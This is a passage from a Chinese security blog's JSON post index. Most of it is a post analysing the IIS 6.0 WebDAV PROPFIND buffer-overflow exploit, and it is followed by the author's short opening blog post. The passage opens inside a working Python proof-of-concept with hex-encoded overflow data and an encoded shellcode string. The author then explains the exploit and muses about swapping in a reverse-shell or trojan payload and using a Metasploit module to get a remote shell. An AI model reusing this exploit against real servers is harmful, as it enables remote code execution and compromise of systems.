9\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'pay+='&gt;'pay+=' (Not &lt;locktoken:write1&gt;) &lt;http://192.168.5.128:88/bbbbbbb'pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'shellcode='\"VYhffffk4diFkDql02Dqm0D1CuEE5n3l0G3j3C0S1p02024B0W3y2G2u4D0k4q3c\".\"0615092E0T0H0l4s4u1k0A2p3G0Y3W3A0u2K2J0P2o4E3U2L370w3N5O3h2p1O2w1o3v4\".\"T3P4n1K3v4n0z3Y0S0M2k5L4J0m4Y2D103V2s4K4t0Q0U0P7o2L4P2O8K3r0j0y0N0s37\".\"2l0m5K0Y8M0S5p4V110Q2J182s7M2K344J3j04VYVTX10X41PZ41H4A4I1TA71TADVTZ3\".\"2PZNBFZDQC02DQD0D13DJEON4F1W9M490R0P0654E2M9Y2F64346K5K450115MN2G0N0\".\"B0L5C5DKO106737KO9W8P0O2L1L0P184E3U0Q8P1G3L5O9R601E671O9W343QOO113RJO\".\"LK8M640M1K3WOL1W4Y2O613V2I4K5C0R0S0PMO2O3W2O8K9R1Z1K0S1H3PLMKM5KKK8M0\".\"S4JJL15612J1267KM2K4D903K03VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQ\".\"AIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYA\".\"ZBABABABAB30APB944JB9K7YMY7Y7O1SKWKQ0X6QLT8Y2TMTJT1K3S7SKT013KLUKS3KL\".\"U3QJR1Y04MT4S1Y6L9UKTLX0I1P096TJPML5N0E5K4O6LMP07MW038R9WJT9K0J4M5NOK\".\"KKMS3N0L4L8S1N8NLW11JV1V6YKO1SMO1P2OMNKOMK4N8QOO0KKR104POLLZ3XLWJXML6\".\"SKN03MQMK0GMQ1ZLZ8K6Y4LKPA\";'pay+=shellcodepay+='&gt;\\r\\n\\r\\n'print paysock.send(pay) data = sock.recv(80960) print datasock.close 用原作者的话说，他的POC是利用3次溢出构建ROP链，绕过内存地址随机化，说实话我是听不懂的任何一个名词的，只了解字面上的意思，但是想了解原理，于是从exp代码分析 从上面的Python代码我们可以进行分析这个漏洞利用的整个过程，个人认为，就是利用了webdav服务的开启，可以进行更多的数据提交方式，默认的话是get,post,cookie，这几类，当然，如果开启接收任何提交方式的请求，那么可以利用put提交方式，直接写shell，类似的提交方式还有move，copy，del等等，但是上面的代码利用提交方式不是http自带的提交方式，而是利用是一个扩展协议，PROPFIND，而不是传统的http协议，propfind正常的情况下是查看属性的提交方式，当我们利用缓冲区域溢出，也就是当提交的数据，超出了程序能够承载的量那么就会导致程序出错，也就是造成了溢出。 从上面的代码我分析了一下，这个poc分为三个部分，导包指定目的IP就不用说了，直接按照自己的理解就是 第一个部分就是利用propfind的方式向服务器进行提交数据。 第二部分就提交的pay数据值就是一段缓冲区域溢出代码，看样子是一些占位比较大的符号进行了hex编码，当webdav接收这些参数的时候，会处理不过来，也就造成了数据溢出，我们提交的数据有一部分已经溢出了webdav程序的这个容器，溢出的数据都会在进程中，如果我们可以控制溢出的数据，那么我们可以进行一个代码执行。 第三个部分也就是我们要控制的溢出参数，上面的poc给定的值是“shellcode”，通过一些测试和询问发现，这个shellcode值可能是利用msf生成的一个payload，然后利用编码器，将代码编为“x86/unicode_upper”，因为本人小白，不太懂底层的东西，感觉这可能是内存或者底层能够识别的编码方式吧，通过这个poc，发现这个shellcode的作用就是在进程中溢出一个计算器的进程，用户权限是network，权限虽然小但是还是有很多可以利用的方法，通过检测发现，这个漏洞貌似只有支持PROPFIND的请求方法才会有效，个人测试了几个扩展协议没有成功溢出shellcode，或许是我的姿势不对吧,至少我这么尝试没有成功。 总结：这个漏洞的总体利用过程 检查服务器是否开启webdav服务【我们可以利用OPTIONS的请求方法进行判断服务器是否开启WEBDAV，且支持propfind的请求方法】 → 通过扩展协议propfind，向服务器发送一个缓冲区溢出代码和可控制的shellcode → 然后服务器接受到这个包发生了缓冲区溢出，将我们的shellcode溢出到了进程中。 那么利用这个漏洞，我们如果可以控制shllecode，是不是可以直接注入一个反弹shell的payload，或者说是一个远程木马，因为直接注入进程等于不用执行文件，绕过waf，等等，当然没有汇编基础还是不行的，所以只能慢慢学，问了问搞编程的朋友，是否可以直接利用这个漏洞写类似于远控程序，或者其他的后门的，他的回答是肯定可以的，具体的话涉及到内存的转换和储存过程，这些我们暂时不深究，因为只有实验才能给出答案，如果我成功了，我肯定会写出续文，虽然这个漏洞挺鸡肋，到此为止总结大概也完了。 以上是个人的愚见总结，其实感觉这个漏洞是挺有意思的，虽然现在用IIS6.0的服务器是越来越少了，但是我相信，在底层，有更多的漏洞都是基于“缓冲区域溢出”，并且常规的waf对此事无法拦截的【比如基于缓冲区域溢出的SQL注入攻击:) 】可惜无奈自己对底层的东西还是了解的太少了。要花时间去补习这些底层知识。 最后附上一个大牛写出来可利用msf直接加载攻击的exp，目前只针对Windows2003 R2版本有效，直接利用Metasploit把这个攻击载荷加入进去，set一下配置即可完成攻击，具体是返回一个network权限的shell。 MSF利用exp: 下载 参考文献：这篇确实讲的很详细，可以学到很多东西！http://www.tuicool.com/articles/7ziu6jE","tags":[{"name":"IIS6.0","slug":"IIS6-0","permalink":"http://fjhack.me/tags/IIS6-0/"},{"name":"代码执行漏洞","slug":"代码执行漏洞","permalink":"http://fjhack.me/tags/代码执行漏洞/"}]},{"title":"诞生日---第一篇博文","date":"2017-04-01T11:48:46.717Z","path":"2017/04/01/01/","text":"Hello，Word！在自己的摸索下，HEXO的博客终于搭建起来了，开这个博客有很多原因，感觉如果不用博客德华都不好意思自己是搞IT得，开玩笑的，其实最重要还是只想让自己做个不浮躁的人，只有沉下心才能学到更多的东西，当然，不一定会有人关注，但是自己的小圈子内能够互相学习，就够了，很乐意结交更多的朋友，一起交流，而不是互相吹捧，因为那毫无意义。每个人都是从小白做起，这个圈子里面似乎并没有尽头，当你接触久了就会发现，这原来是个无底洞，因为技术本来就是没有尽头的，虽然洞很深而且还有很多的坑，可是依然有那么多人坚持着，也许为了好奇，也许为了￥￥，或许就是为了图一时兴起的快感无论你想得到的是什么 但是过程都是一样的。人活着不就是为了做自己想做的事情，虽然有制度，有规则约束着你，但是你照样可以看到”乌托邦”。 我很乐意分享自己的经验，也许没人看得到，但是至少自己去做了，如果有幸有人看到并且指出了我的错误，那我也学到了更多的东西，这样没什么不好的。 结语就像每一个时代里的人都觉得自己没有赶上一个好的时代一样。这里没有末路，你从不曾孤独。 ——韩寒 so Come on :)","tags":[{"name":"感言","slug":"感言","permalink":"http://fjhack.me/tags/感言/"}]}]